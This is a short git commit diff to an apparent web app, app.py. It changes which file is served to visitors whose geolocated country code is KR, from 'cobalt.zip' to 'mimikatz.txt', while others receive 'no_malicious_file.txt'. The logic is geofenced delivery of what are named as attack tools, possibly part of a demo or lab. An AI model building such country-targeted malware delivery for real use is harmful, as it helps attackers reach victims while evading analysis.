86963a5efb0d9ee74191a9efa6c35b8bf8071fde
itf-mwpark <mw.park@itforest.net>
2023-06-30 14:43:00 +0900

    Update app.py

--- app.py
+++ app.py
@@ -15,7 +15,7 @@ def home():
     country_code = res.json()["data"].get("country_code", None)
 
     if country_code == "KR":
-        path += "cobalt.zip"
+        path += "mimikatz.txt"
 
     else:
         path += "no_malicious_file.txt"
